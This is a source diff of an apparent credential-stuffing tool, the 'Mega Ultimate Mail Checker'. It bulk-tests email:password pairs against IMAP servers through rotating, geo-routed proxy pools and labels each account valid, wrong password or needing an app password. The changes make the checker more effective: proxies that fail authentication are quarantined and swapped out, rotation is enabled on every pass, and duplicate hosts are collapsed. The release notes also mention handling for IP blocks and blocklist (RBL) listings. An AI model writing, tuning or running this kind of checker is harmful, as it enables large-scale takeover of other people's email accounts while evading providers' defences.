@@ -1,9 +1,41 @@
 """
-Mega Ultimate Mail Checker — v13.18
+Mega Ultimate Mail Checker — v13.19
 ===================================
 Complete rewrite. SMTP reachability is an OPT-IN pre-check stage (never inside
 the validator), status classification actually works, and every direct-connection
 line carries the real egress IP / region / country / VPN state.
+
+v13.19 changes  (proxy-layer 407 was being blamed on the MAIL HOST)
+-------------------------------------------------------------------
+* CRITICAL FIX — A 407 IS NO LONGER A HOST FAILURE.
+  The live trace showed one 407-dead proxy walking the ENTIRE host ladder:
+  first host timed out, then every later host on the same proxy returned
+  "Socket error: 407" instantly. Each 407 was classified connection_failed and
+  the engine advanced the HOST, burning 5 rungs on a proxy that never
+  authenticated. windstream / mediacombb / suddenlink never once reached an
+  AUTH line across ~40 accounts because of this.
+  Now: a 407 raises ProxyAuthError, the proxy is QUARANTINED for the run, the
+  engine rotates to a fresh proxy and RETRIES THE SAME HOST, and the rung is
+  not consumed.
+* CRITICAL FIX — ROTATION IS ENABLED IN PASS 1.
+  allow_rotate was False on the primary pass, so pass 1 had ZERO rotations.
+  A dead proxy therefore had to fail the whole ladder before pass 2 was allowed
+  to rotate. Rotation is now available in every pass (bounded by MAX_ROTATIONS).
+* NEW STATUS — PROXY_UNHEALTHY.  When every failure for an account happened in
+  the proxy hop, the account is no longer reported as CONNECTION_FAILED with a
+  "password could not be tested" that looks like a mailbox outage. It is
+  reported as PROXY_UNHEALTHY, so a dead pool is self-reporting.
+* PROXY HEALTH BANNER.  The run logs and the sidebar show
+  "alive / filtered / loaded" and how many nodes are quarantined.
+* PROXY SCHEME MEMORY.  Each node remembers whether SOCKS5 or HTTP worked, so
+  the dead leg is not re-attempted on every rung (halves the cost of every
+  proxied connect on an HTTP-only node).
+* TIMEOUT BUDGET RAISED.  Per-rung cost 5s -> 10s floor, legacy pass 3.5s ->
+  6s floor, socket legs are now a fixed FRACTION of the rung budget instead of
+  a fraction of the global slider, so a rung can actually finish a TLS
+  handshake and a greeting inside its slot.
+* HOST LADDER DEDUPED BY RESOLVED IP.  imap./mail./email.<domain> frequently
+  point at the SAME box; the ladder now collapses them instead of paying 3x.
 
 v13.18 changes  (Microsoft XOAUTH2 + read-timeout + dead-host ordering)
 ----------------------------------------------------------------------
@@ -26,64 +58,6 @@ v13.18 changes  (Microsoft XOAUTH2 + read-timeout + dead-host ordering)
   deadline.
 * ms_oauth errors are triaged: MsTokenTransport never overwrites a verdict,
   AADSTS50126 -> WRONG_PASSWORD, AADSTS50076/50079 -> NEED_APP_PASSWORD.
-
-v13.17 changes  (phase windows were being blown out by 2x-cost attempts)
-------------------------------------------------------------------------
-* CRITICAL FIX — ONE ATTEMPT NOW COSTS ~its slot, NOT ~2x it.
-* The phase trace now reports how many rungs the window cut.
-* MAILBOX READER FIX — v13.16 assigned `success_msgs` while the check read
-  `success_read`, so a successful read was reported as a failure.
-
-v13.16 changes  (legacy 143 starvation + 168s wall time + RBL ambiguity)
-------------------------------------------------------------------------
-* CRITICAL FIX — THE LEGACY 143/110 RUNGS ARE NO LONGER SKIPPED.
-* SLOWNESS FIX — THE BUDGET FLOOR IS LOWERED.
-* RBL RESTRICTION IS CLASSIFIED (status.RBL_BLOCKED).
-* The terminal CONNECTION_FAILED detail states the password could not be tested.
-
-v13.15 changes  (APP must try the OWN host + pattern before it finalises)
-------------------------------------------------------------------------
-* CRITICAL FIX — NEED_APP_PASSWORD NO LONGER SHORT-CIRCUITS.
-* CRITICAL FIX — VERDICT PRIORITY.
-* `tried_hosts` records every host actually dialled.
-
-v13.14 changes  (false verdicts from foreign fallbacks + starved 143 rungs)
---------------------------------------------------------------------------
-* CRITICAL FIX — FOREIGN WRONG IS NO LONGER TERMINAL.
-* CRITICAL FIX — ORDERING: LOCAL-PRIORITY -> other local -> FOREIGN.
-* CRITICAL FIX — 143/110 STARVATION: each phase reserves a tail for legacy.
-
-v13.13 changes  (the bare-domain FALLBACK host was never dialled)
-----------------------------------------------------------------
-* CRITICAL FIX — APEX FALLBACK GUARANTEED (force-included final rung).
-
-v13.12 changes  (alias-root + numbered-prefix + bare-domain host coverage)
---------------------------------------------------------------------------
-* CRITICAL FIX — host COVERAGE for rebrands / numbered prefixes / apex hosts.
-
-v13.11 changes  (the domain's OWN servers were structurally unreachable)
------------------------------------------------------------------------
-* CRITICAL FIX — FAMILY DOMAINS NEVER TRIED THEIR OWN HOSTS.
-
-v13.10 changes  (bounded rungs — the direct phase was being starved)
--------------------------------------------------------------------
-* proxy_connect() bounded to ~1.5x; duplicate rung removed; budget floors.
-
-v13.9 changes  (host-major ladder)
-----------------------------------
-* Host-major ladder; legacy rungs demoted; direct pass sweeps all hosts.
-
-v13.8 changes  (verdict retention + budget rebalance + 407 breaker)
--------------------------------------------------------------------
-* Verdict retention, 55% proxy budget, 407 breaker, 'lookup failed' falls through.
-
-v13.7 changes
--------------
-* SMTP pre-check OFF by default; SMTP checkbox in Advanced Control Rules.
-
-v13.6 changes
--------------
-* status.py exports ALL_STATUSES; SMTP pre-check bucket; direct egress stamping.
 
 NO hardcoded proxy IPs and NO faked geo table. Everything is derived from
 proxies.txt / Streamlit secrets / live DNS / live ip-api.
@@ -312,7 +286,8 @@ except Exception as _hosts_rank_err:
 try:
     from status import (
         VALID, WRONG, WRONG_PASSWORD, APP, NEED_APP_PASSWORD,
-        FAILED, CONNECTION_FAILED, SKIP, SKIPPED_COOLDOWN, UNKNOWN,
+        FAILED, CONNECTION_FAILED, PROXY_UNHEALTHY,
+        SKIP, SKIPPED_COOLDOWN, UNKNOWN,
         RETRY, RETRY_LATER, RBL, RBL_BLOCKED, SMTP_FAILED, DNS_FAILED,
         ALL_STATUSES as ST_ALL, LABELS as ST_LABELS, COLORS as ST_COLORS,
         PRIORITY as ST_PRIORITY,
@@ -329,6 +304,7 @@ except Exception as _status_err:
     WRONG = WRONG_PASSWORD = "wrong_password"
     APP = NEED_APP_PASSWORD = "need_app_password"
     FAILED = CONNECTION_FAILED = "connection_failed"
+    PROXY_UNHEALTHY = "proxy_unhealthy"
     SKIP = SKIPPED_COOLDOWN = "skipped_cooldown"
     UNKNOWN = "unknown"
     RETRY = RETRY_LATER = "retry_later"
@@ -336,10 +312,12 @@ except Exception as _status_err:
     SMTP_FAILED = "smtp_failed"
     DNS_FAILED = "dns_failed"
     ST_ALL = [VALID, WRONG_PASSWORD, NEED_APP_PASSWORD, RETRY_LATER, RBL_BLOCKED,
-              SMTP_FAILED, DNS_FAILED, CONNECTION_FAILED, UNKNOWN, SKIPPED_COOLDOWN]
+              SMTP_FAILED, DNS_FAILED, CONNECTION_FAILED, PROXY_UNHEALTHY,
+              UNKNOWN, SKIPPED_COOLDOWN]
     ST_LABELS = {s: s.upper() for s in ST_ALL}
     ST_COLORS = {
         VALID: "#22c55e", WRONG_PASSWORD: "#ef4444", CONNECTION_FAILED: "#eab308",
+        PROXY_UNHEALTHY: "#e879f9",
         NEED_APP_PASSWORD: "#3b82f6", RETRY_LATER: "#ffffff", RBL_BLOCKED: "#facc15",
         SMTP_FAILED: "#a855f7", DNS_FAILED: "#f97316", UNKNOWN: "#94a3b8",
         SKIPPED_COOLDOWN: "#a78bfa",
@@ -349,7 +327,7 @@ except Exception as _status_err:
     ST_PRIORITY = {
         VALID: 0, NEED_APP_PASSWORD: 1, WRONG_PASSWORD: 2, RBL_BLOCKED: 3,
         RETRY_LATER: 4, SMTP_FAILED: 5, DNS_FAILED: 6, CONNECTION_FAILED: 7,
-        UNKNOWN: 8, SKIPPED_COOLDOWN: 9,
+        PROXY_UNHEALTHY: 8, UNKNOWN: 9, SKIPPED_COOLDOWN: 10,
     }
 
     _FB_APP = ("app password", "application-specific", "basic authentication is disabled",
@@ -362,7 +340,7 @@ except Exception as _status_err:
                  "blacklisted", "rate limit", "throttl", "try again", "unavailable")
     _FB_CONN = ("timed out", "timeout", "connection refused", "connection reset", "socket error",
                 "eof", "tls not supported", "stls not supported", "ssl", "no route to host",
-                "wrong version number", "proxy and direct fallback", "handshake")
+                "wrong version number", "proxy and direct fallback", "handshake", "407")
     _FB_WRONG_STRONG = ("realmless login not allowed", "authenticationfailed",
                         "authentication failed", "invalid credentials", "login incorrect",
                         "wrong password", "authenticate error")
@@ -449,6 +427,25 @@ str_lit.set_page_config(
 )
 
 # ============================================================================
+# PROXY-LAYER FAILURE CONTRACT  (v13.19)
+# ============================================================================
+# A 407 is a PROXY problem.  The mail host behind it is still untested, so the
+# engine must rotate the proxy and retry the SAME host - never advance the host.
+
+PROXY_407_QUARANTINE = 2          # 407s on a node before it leaves the pool
+PROXY_407_FORCE_DIRECT = 2        # 407s on an account with no fresh proxy -> go direct
+
+
+class ProxyAuthError(ConnectionError):
+    """The PROXY rejected us (407). The mail host is still untested."""
+
+
+def _is_proxy_auth_fail(msg) -> bool:
+    m = (msg or "").lower()
+    return ("407" in m) or ("proxy authentication required" in m)
+
+
+# ============================================================================
 # THEME ENGINE
 # ============================================================================
 
@@ -486,8 +483,8 @@ def default_theme() -> dict:
         "bg": p["bg"], "panel": p["panel"], "text": p["text"],
         "radius": 14, "glow": True, "animate": True, "glass": True,
         "colorize_logs": True,
-        "hero_title": "⚡ Mega Ultimate Mail Checker v13.18",
-        "hero_sub": "World-Coverage Edition — router-aware host ranking, rotating proxy pool, geo-call routing, Microsoft XOAUTH2, retryable IP-block handling, optional SMTP pre-check, anti-spoofing post-auth validation.",
+        "hero_title": "⚡ Mega Ultimate Mail Checker v13.19",
+        "hero_sub": "World-Coverage Edition — router-aware host ranking, rotating proxy pool with 407 quarantine, geo-call routing, Microsoft XOAUTH2, retryable IP-block handling, optional SMTP pre-check, anti-spoofing post-auth validation.",
     }
 
 def load_theme() -> dict:
@@ -678,9 +675,9 @@ def render_hero(th: dict):
                 <span class="bb-tag">Normal</span>
                 <span class="bb-tag">Deep / Aggressive</span>
                 <span class="bb-tag">Proxy Backed</span>
+                <span class="bb-tag">407 Quarantine</span>
                 <span class="bb-tag">Microsoft XOAUTH2</span>
                 <span class="bb-tag">Geo-Call Routing</span>
-                <span class="bb-tag">Optional SMTP Pre-Check</span>
                 <span class="bb-tag">Anti-Spoof Post-Auth</span>
             </div>
         </div>
@@ -700,11 +697,13 @@ def section_title(icon: str, title: str, subtitle: str = ""):
 # LIVE EXECUTION STREAM COLOUR CONTRACT
 #   valid = green | wrong = red | connection failed = yellow
 #   app password / 2FA = blue | RETRY_LATER = white | RBL blocked = amber
+#   proxy unhealthy = fuchsia
 # ---------------------------------------------------------------------------
 TAG_COLORS = {
     "VALID": "#22c55e",
     "WRONG_PASSWORD": "#ef4444",
     "CONNECTION_FAILED": "#eab308",
+    "PROXY_UNHEALTHY": "#e879f9",
     "NEED_APP_PASSWORD": "#3b82f6",
     "RETRY_LATER": "#ffffff",
     "RBL_BLOCKED": "#facc15",
@@ -719,8 +718,8 @@ TAG_COLORS = {
 def _line_color(line: str) -> str:
     up = str(line).upper()
     for tag in ("SKIPPED_COOLDOWN", "NEED_APP_PASSWORD", "RBL_BLOCKED", "WRONG_PASSWORD",
-                "CONNECTION_FAILED", "RETRY_LATER", "SMTP_FAILED", "DNS_FAILED",
-                "VALID", "UNKNOWN", "EXCEPTION", "ERROR"):
+                "PROXY_UNHEALTHY", "CONNECTION_FAILED", "RETRY_LATER", "SMTP_FAILED",
+                "DNS_FAILED", "VALID", "UNKNOWN", "EXCEPTION", "ERROR"):
         if f"[{tag}]" in up:
             return TAG_COLORS.get(tag, "#cbd5e1")
     if "[CLASSIFIED: VALID]" in up:
@@ -737,6 +736,8 @@ def _line_color(line: str) -> str:
         return TAG_COLORS["SMTP_FAILED"]
     if "[CLASSIFIED: DNS_FAILED]" in up:
         return TAG_COLORS["DNS_FAILED"]
+    if "[CLASSIFIED: PROXY_UNHEALTHY]" in up:
+        return TAG_COLORS["PROXY_UNHEALTHY"]
     if "[CLASSIFIED:" in up:
         return TAG_COLORS["CONNECTION_FAILED"]
     return ""
@@ -865,9 +866,9 @@ if "valid_results" not in str_lit.session_state:
     str_lit.session_state.valid_results = loaded_valid
     str_lit.session_state.clean_valid_count = len(loaded_valid)
     str_lit.session_state.run_valid_count = len(loaded_valid)
-for _k in ("wrong_results", "need_app_results", "conn_results", "retry_results",
-           "rbl_results", "smtp_results", "dns_results", "skip_results",
-           "report_entries", "log_lines", "startup_entries",
+for _k in ("wrong_results", "need_app_results", "conn_results", "proxy_results",
+           "retry_results", "rbl_results", "smtp_results", "dns_results",
+           "skip_results", "report_entries", "log_lines", "startup_entries",
            "pre_dns_failed", "pre_smtp_failed"):
     if _k not in str_lit.session_state:
         str_lit.session_state[_k] = []
@@ -932,6 +933,13 @@ circuit_breaker_until = {}
 failed_domain_cache = {}
 _host_dns_cache = {}
 _host_dns_lock = threading.Lock()
+
+# v13.19 — proxy-layer health
+proxy_quarantine = set()                # nodes that 407'd, out for this run
+proxy_quarantine_lock = threading.Lock()
+_proxy_407 = defaultdict(int)           # node -> 407 strike count
+_proxy_scheme = {}                      # node -> socks.HTTP / socks.SOCKS5 that worked
+_proxy_scheme_lock = threading.Lock()
 
 _rr_lock = threading.Lock()
 _rr_index = 0
@@ -1099,6 +1107,12 @@ allow_blacklist_ips = str_lit.sidebar.toggle(
     "Allow Blacklisted / Flagged Proxy IPs", value=False,
     help="When disabled (default), circuit-broken proxies are excluded from BOTH the pool AND the live ladder."
 )
+proxy_quarantine_ui = str_lit.sidebar.toggle(
+    "🩹 Quarantine nodes that return 407", value=True,
+    help="ON (default): a node that answers '407 Proxy Authentication Required' twice is pulled out of the pool "
+         "for the rest of the run, so the remaining accounts never pay for it. The quarantine lifts automatically "
+         "if the whole pool ends up quarantined."
+)
 
 str_lit.sidebar.markdown("---")
 str_lit.sidebar.markdown("### 🔀 Proxy Routing Intelligence")
@@ -1199,6 +1213,60 @@ def parse_proxy(proxy_str):
     except Exception:
         pass
     return None
+
+# ---------------------------------------------------------------------------
+# PROXY-LAYER HELPERS  (v13.19)
+# ---------------------------------------------------------------------------
+def proxy_is_quarantined(proxy_str) -> bool:
+    if not proxy_str:
+        return False
+    with proxy_quarantine_lock:
+        return proxy_str in proxy_quarantine
+
+
+def quarantine_proxy(proxy_str, reason=""):
+    """Pull a 407-dead node out of the run. Returns True if newly quarantined."""
+    if not proxy_str:
+        return False
+    with proxy_quarantine_lock:
+        if proxy_str in proxy_quarantine:
+            return False
+        proxy_quarantine.add(proxy_str)
+        size = len(proxy_quarantine)
+    with alive_pool_lock:
+        total = len(alive_pool)
+    log_startup(f"Proxy quarantined ({reason or '407'}): {proxy_str} "
+                f"[{size} quarantined / {total} alive]", quiet=True)
+    return True
+
+
+def quarantine_size() -> int:
+    with proxy_quarantine_lock:
+        return len(proxy_quarantine)
+
+
+def clear_proxy_quarantine():
+    with proxy_quarantine_lock:
+        proxy_quarantine.clear()
+    with _proxy_scheme_lock:
+        pass
+    _proxy_407.clear()
+
+
+def _scheme_order(proxy_str):
+    """Try the scheme that last worked for this node FIRST (halves connect cost)."""
+    with _proxy_scheme_lock:
+        pref = _proxy_scheme.get(proxy_str)
+    if pref == socks.HTTP:
+        return (socks.HTTP, socks.SOCKS5)
+    if pref == socks.SOCKS5:
+        return (socks.SOCKS5, socks.HTTP)
+    return (socks.SOCKS5, socks.HTTP)
+
+
+def _remember_scheme(proxy_str, ptype):
+    with _proxy_scheme_lock:
+        _proxy_scheme[proxy_str] = ptype
 
 # ---------------------------------------------------------------------------
 # LIVE GEO (no static table — everything comes from ip-api)
@@ -1335,7 +1403,7 @@ def test_single_proxy(proxy_str):
 
         start = time.time()
         test_success = False
-        for ptype in (socks.SOCKS5, socks.HTTP):
+        for ptype in _scheme_order(proxy_str):
             sock = None
             try:
                 kw = {"proxy_type": ptype, "proxy_addr": info["host"], "proxy_port": info["port"]}
@@ -1344,6 +1412,7 @@ def test_single_proxy(proxy_str):
                     kw["proxy_password"] = info["pass"]
                 sock = socks.create_connection(("8.8.8.8", 53), timeout=2.5, **kw)
                 test_success = True
+                _remember_scheme(proxy_str, ptype)
                 break
             except Exception:
                 continue
@@ -1489,6 +1558,7 @@ def build_cfg():
         "MIN_PROXY_SCORE": min_proxy_score,
         "PROXY_PRECHECK_TIMEOUT": proxy_precheck_timeout,
         "ALLOW_BLACKLIST_IPS": allow_blacklist_ips,
+        "QUARANTINE_407": proxy_quarantine_ui,
         "POOL_MODE": pool_mode,
         "SELECTED_COUNTRIES": selected_countries,
         "SELECTED_MIX_COUNTRIES": selected_mix_countries,
@@ -1532,6 +1602,7 @@ for _k, _v in (
     ("RETRY_CONNECTION_FAILED", 0), ("MAX_ACCOUNTS", 5000), ("MAX_WORKERS_START", 30),
     ("DYNAMIC_WORKER_SCALING", True), ("PROXY_MODE", "fallback"), ("ALLOW_BLACKLIST_IPS", False),
     ("RANDOM_ROTATION", True), ("GEO_CALL", False), ("CONNECTION_HINT", "Auto"), ("SMTP_CHECK", False),
+    ("QUARANTINE_407", True),
 ):
     CFG.setdefault(_k, _v)
 
@@ -1541,7 +1612,8 @@ log_startup(
     f"proxy_mode={CFG.get('PROXY_MODE')} hosts/domain={CFG.get('MAX_HOSTS_PER_DOMAIN')} "
     f"starttls={CFG.get('TRY_STARTTLS')} alt_user={CFG.get('TRY_ALT_USERNAME')} "
     f"self_signed={CFG.get('ALLOW_SELF_SIGNED')} allow_blacklist={CFG.get('ALLOW_BLACKLIST_IPS')} "
-    f"random_rotation={CFG.get('RANDOM_ROTATION')} geo_call={CFG.get('GEO_CALL')} smtp_precheck={CFG.get('SMTP_CHECK')}"
+    f"random_rotation={CFG.get('RANDOM_ROTATION')} geo_call={CFG.get('GEO_CALL')} "
+    f"smtp_precheck={CFG.get('SMTP_CHECK')} quarantine_407={CFG.get('QUARANTINE_407')}"
 )
 
 # ============================================================================
@@ -1703,16 +1775,43 @@ def fast_fail_dns_check(host):
     except Exception:
         return False
 
+def _dedupe_hosts_by_ip(hosts, cap=3):
+    """Collapse imap./mail./email.<domain> when they point at the SAME box.
+
+    v13.19: the live trace showed the ladder spending 3-4 rungs on hostnames
+    that resolve to one server.  Order is preserved; the cap is applied AFTER
+    de-duplication, with a top-up pass so the cap is still reached when the
+    names are genuinely distinct.
+    """
+    out, seen_ips = [], set()
+    for h in hosts:
+        if not h or h in out:
+            continue
+        try:
+            ip = socket.gethostbyname(h)
+        except Exception:
+            ip = "?" + h
+        if ip in seen_ips:
+            continue
+        seen_ips.add(ip)
+        out.append(h)
+        if len(out) >= cap:
+            break
+    if len(out) < cap:
+        for h in hosts:
+            if len(out) >= cap:
+                break
+            if h and h not in out:
+                out.append(h)
+    return out
+
 def proxy_connect(host, port, proxy_str, timeout=None, remote_dns=True):
     """Proxied TCP connect.
 
-    Each leg gets a THIRD of the budget so connect+connect costs ~t.  The
-    post-connect read gets HALF the budget (min 4s) because Yahoo / ATT / MS
-    greetings routinely need longer than 2s through a laggy rotating proxy.
-
-    The inner direct fallback is skipped in 'fallback' mode, where the outer
-    phase already runs a full direct sweep - keeping it doubled the cost of
-    every dead rung for no benefit.
+    v13.19: the socket legs are now a fixed FRACTION of the rung budget instead
+    of a fraction of the global slider, so a rung can actually finish inside the
+    slot the phase allocated to it.  A 407 raises ProxyAuthError so the caller
+    rotates the proxy instead of blaming the mail host.
     """
     base_timeout = timeout or CFG["PROXY_CONNECT_TIMEOUT"]
     try:
@@ -1720,14 +1819,14 @@ def proxy_connect(host, port, proxy_str, timeout=None, remote_dns=True):
             fails = proxy_meta.get(proxy_str, {}).get("fails", 0)
     except Exception:
         fails = 0
-    effective_timeout = max(2.0, base_timeout - (fails * 0.1))
-    leg_to = max(1.5, effective_timeout / 3.0)
-    read_to = max(4.0, effective_timeout / 2.0)
+    effective_timeout = max(3.0, base_timeout - (fails * 0.1))
+    leg_to = max(2.5, effective_timeout * 0.35)
+    read_to = max(4.0, effective_timeout * 0.55)
 
     if not proxy_str or proxy_str == "direct":
         if not fast_fail_dns_check(host):
             raise RuntimeError(f"Fast-fail DNS check failed: Host '{host}' does not resolve locally")
-        s = socket.create_connection((host, port), timeout=leg_to)
+        s = socket.create_connection((host, port), timeout=max(5.0, effective_timeout * 0.5))
         s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
         s.settimeout(read_to)
         return s
@@ -1737,7 +1836,8 @@ def proxy_connect(host, port, proxy_str, timeout=None, remote_dns=True):
         raise RuntimeError("bad proxy format or socks unavailable")
 
     last_err = None
-    for ptype in (socks.SOCKS5, socks.HTTP):
+    proxy_auth_err = None
+    for ptype in _scheme_order(proxy_str):
         try:
             kw = {"proxy_type": ptype, "proxy_addr": info["host"], "proxy_port": info["port"], "proxy_rdns": remote_dns}
             if info["user"]:
@@ -1746,15 +1846,21 @@ def proxy_connect(host, port, proxy_str, timeout=None, remote_dns=True):
             s = socks.create_connection((host, port), timeout=leg_to, **kw)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
             s.settimeout(read_to)
+            _remember_scheme(proxy_str, ptype)
             return s
         except Exception as proxy_ex:
             last_err = proxy_ex
+            if _is_proxy_auth_fail(str(proxy_ex)):
+                proxy_auth_err = proxy_ex
 
     outer_has_direct_sweep = CFG.get("PROXY_MODE", "fallback") == "fallback"
 
+    if proxy_auth_err is not None:
+        raise ProxyAuthError(f"Proxy authentication required for {host}:{port}: {proxy_auth_err}")
+
     if fast_fail_dns_check(host) and not outer_has_direct_sweep:
         try:
-            direct_sock = socket.create_connection((host, port), timeout=leg_to)
+            direct_sock = socket.create_connection((host, port), timeout=max(5.0, effective_timeout * 0.5))
             direct_sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
             direct_sock.settimeout(read_to)
             return direct_sock
@@ -1777,19 +1883,19 @@ def _tls_context(host: str, verify: bool):
     return ctx
 
 def _raw_socket(host, port, proxy_str=None, timeout=None):
-    """Post-connect read gets HALF the budget (min 4s), not a third.
+    """Post-connect read gets >half the rung budget.
 
     The old t/3 read (~2.1s at a 6.4s slot) was cutting Yahoo / ATT / MS
     greetings off mid-handshake and reporting them as timeouts.
     """
     t = timeout or CFG["TIMEOUT"]
-    read_to = max(4.0, t / 2.0)
+    read_to = max(4.0, t * 0.55)
     if proxy_str and proxy_str != "direct":
         s = proxy_connect(host, port, proxy_str, timeout=t)
     else:
         if not fast_fail_dns_check(host):
             raise RuntimeError(f"Fast-fail DNS check failed: Host '{host}' does not resolve locally")
-        s = socket.create_connection((host, port), timeout=max(2.0, t / 2.0))
+        s = socket.create_connection((host, port), timeout=max(5.0, t * 0.5))
     s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
     s.settimeout(read_to)
     return s
@@ -1815,7 +1921,8 @@ def px_tag(proxy_str):
     if not info:
         return "proxy"
     meta = proxy_meta.get(proxy_str, {})
-    return f"{info.get('host')}:{info.get('port')} | {meta.get('country') or '?'} | {meta.get('region') or '?'}"
+    q = " [QUARANTINED]" if proxy_is_quarantined(proxy_str) else ""
+    return f"{info.get('host')}:{info.get('port')} | {meta.get('country') or '?'} | {meta.get('region') or '?'}{q}"
 
 # ============================================================================
 # PROTOCOL CLIENTS — override _create_socket(), NOT open()
@@ -1886,10 +1993,16 @@ def _is_proxy_level_error(msg):
         s = (msg or "").lower()
         return any(k in s for k in ("407", "proxy auth", "proxy connect", "socks"))
 
-def record_proxy_attempt(proxy_str, success, is_network_error=False):
+def record_proxy_attempt(proxy_str, success, is_network_error=False, is_proxy_auth=False):
     try:
         if not proxy_str:
             return
+        if is_proxy_auth and CFG.get("QUARANTINE_407", True):
+            with proxy_quarantine_lock:
+                _proxy_407[proxy_str] += 1
+                strikes = _proxy_407[proxy_str]
+            if strikes >= PROXY_407_QUARANTINE:
+                quarantine_proxy(proxy_str, f"{strikes}x 407")
         threshold = int(CFG.get("BLACKLIST_CF", 15))
         with proxy_lock:
             if proxy_str not in proxy_meta:
@@ -2053,7 +2166,12 @@ def smtp_failed_check(domain, px, trace_logs):
 # ============================================================================
 
 def sample_alive_proxy(exclude=None, domain=None):
-    """Random rotation (default) or round-robin, with optional geo-call bias."""
+    """Random rotation (default) or round-robin, with optional geo-call bias.
+
+    v13.19: quarantined (407) nodes are skipped.  If every remaining candidate
+    is quarantined the quarantine is lifted for the pool so the run is never
+    left with no path at all.
+    """
     global _rr_index
     exclude = set(exclude or ())
     with alive_pool_lock:
@@ -2063,6 +2181,23 @@ def sample_alive_proxy(exclude=None, domain=None):
             pool = [p for p in alive_pool if p]
     if not pool:
         return None
+
+    if CFG.get("QUARANTINE_407", True):
+        with proxy_quarantine_lock:
+            q = set(proxy_quarantine)
+        fresh = [p for p in pool if p not in q]
+        if not fresh:
+            with alive_pool_lock:
+                whole = set(alive_pool)
+            if q and whole and q >= whole:
+                with proxy_quarantine_lock:
+                    proxy_quarantine.clear()
+                with proxy_quarantine_lock:
+                    _proxy_407.clear()
+                log_startup("Quarantine lifted: every pool node had 407'd - retrying them all.", quiet=True)
+                fresh = pool
+        if fresh:
+            pool = fresh
 
     if CFG.get("GEO_CALL", False) and domain:
         want = tld_country(domain)
@@ -2084,6 +2219,9 @@ _tunnel_lock = threading.Lock()
 _TUNNEL_TTL = 120
 
 def proxy_tunnel_ok(proxy_str, target=("imap.gmail.com", 993), timeout=3.0):
+    """Open a real tunnel through the node. A 407 raises inside PySocks and is
+    caught here, so a 407-dead node is reported False instead of entering the
+    pool."""
     try:
         if not proxy_str:
             return True
@@ -2091,7 +2229,7 @@ def proxy_tunnel_ok(proxy_str, target=("imap.gmail.com", 993), timeout=3.0):
         if not info or not SOCKS_OK:
             return False
         host, port = target
-        for ptype in (socks.HTTP, socks.SOCKS5):
+        for ptype in _scheme_order(proxy_str):
             s = None
             try:
                 kw = {"proxy_type": ptype, "proxy_addr": info["host"],
@@ -2100,6 +2238,7 @@ def proxy_tunnel_ok(proxy_str, target=("imap.gmail.com", 993), timeout=3.0):
                     kw["proxy_username"] = info["user"]
                     kw["proxy_password"] = info["pass"]
                 s = socks.create_connection((host, port), timeout=timeout, **kw)
+                _remember_scheme(proxy_str, ptype)
                 return True
             except Exception:
                 continue
@@ -2174,6 +2313,8 @@ def refresh_alive_pool():
     with alive_pool_lock:
         alive_pool[:] = live
     enrich_proxy_geo(live)
+    log_startup(f"Alive pool refreshed: {len(live)} node(s) passed the tunnel probe "
+                f"out of {len(raw)} candidate(s).", quiet=True)
 
 def start_alive_refresher():
     if any(t.name == "alive-pool" for t in threading.enumerate()):
@@ -2216,9 +2357,17 @@ with str_lit.expander("🔍 View All Startup Entries & What Is Going On In The H
 with str_lit.sidebar:
     str_lit.markdown("---")
     str_lit.markdown("### 🌐 Proxy Management & Health")
-    str_lit.info(f"Loaded Proxies: **{len(all_proxies)}** | Filtered Pool: **{len(filtered_pool)}**")
+    _q_now = quarantine_size()
+    _alive_now = len(alive_pool)
+    str_lit.info(f"Loaded Proxies: **{len(all_proxies)}** | Filtered Pool: **{len(filtered_pool)}** | Alive: **{_alive_now}**")
+    if _q_now:
+        str_lit.warning(f"🩹 Quarantined for 407: **{_q_now}** node(s)")
     if not all_proxies:
         str_lit.caption("No proxies configured — the engine will run fully DIRECT until you add some.")
+    elif _alive_now == 0:
+        str_lit.warning("⚠ No node passed the tunnel probe. The run will go fully DIRECT.")
+    else:
+        str_lit.caption("A 407 means the PROXY rejected you, not the mailbox. Quarantined nodes are retried automatically once the whole pool is out.")
 
     with str_lit.expander("➕ Add Custom Proxies", expanded=False):
         custom_proxy_text = str_lit.text_area("Paste proxies (host:port or user:pass@host:port)", placeholder="123.45.67.89:8080", height=100)
@@ -2312,9 +2461,11 @@ with str_lit.sidebar:
                     "Score": meta.get("score", 50),
                     "Fails": meta.get("fails", 0),
                     "Successes": meta.get("success", 0),
+                    "407s": _proxy_407.get(p_str, 0),
+                    "Quarantined": "yes" if proxy_is_quarantined(p_str) else "",
                 })
             str_lit.dataframe(pd.DataFrame(rows), use_container_width=True)
-            col_ref1, col_ref2 = str_lit.columns(2)
+            col_ref1, col_ref2, col_ref3 = str_lit.columns(3)
             with col_ref1:
                 if str_lit.button("🔄 Refresh Dashboard"):
                     str_lit.rerun()
@@ -2326,6 +2477,11 @@ with str_lit.sidebar:
                                 proxy_meta.pop(k, None)
                     save_proxy_meta()
                     str_lit.success("Cleaned!")
+                    str_lit.rerun()
+            with col_ref3:
+                if str_lit.button("♻️ Lift 407 Quarantine"):
+                    clear_proxy_quarantine()
+                    str_lit.success("Quarantine lifted.")
                     str_lit.rerun()
         else:
             str_lit.info("No proxy metadata recorded yet.")
@@ -2624,6 +2780,7 @@ if raw_text:
         ("🕓 RETRY_LATER Found", "retry_results"),
         ("🚫 RBL Blocked Found", "rbl_results"),
         ("🔌 Connection Failed Found", "conn_results"),
+        ("🩹 Proxy Unhealthy Found", "proxy_results"),
     ]
 
     inspect_options = list(PREFILTER_LABELS) + [label for label, _ in RESULT_INSPECT]
@@ -3218,10 +3375,11 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
     dns_ok = True
 
     best_verdict = {"status": None, "detail": ""}
+    flags = {"saw_407": False, "saw_nonproxy": False}
     force_direct = {"flag": False}
     host_407 = {}
     net_failed_hosts = set()
-    MAX_ROTATIONS = 2
+    MAX_ROTATIONS = 3
 
     try:
         if conf.get("type") == "zero_access":
@@ -3265,15 +3423,16 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                 px = sample_alive_proxy(domain=domain)
 
         _all_imap = [h for h in (conf.get("imap") or []) if h]
-        _imap_cap = max(max_hosts, 4)
-        imap_hosts = _all_imap[:_imap_cap]
+        _imap_cap = max(2, min(4, max_hosts))
+        imap_hosts = _dedupe_hosts_by_ip(_all_imap, cap=_imap_cap)
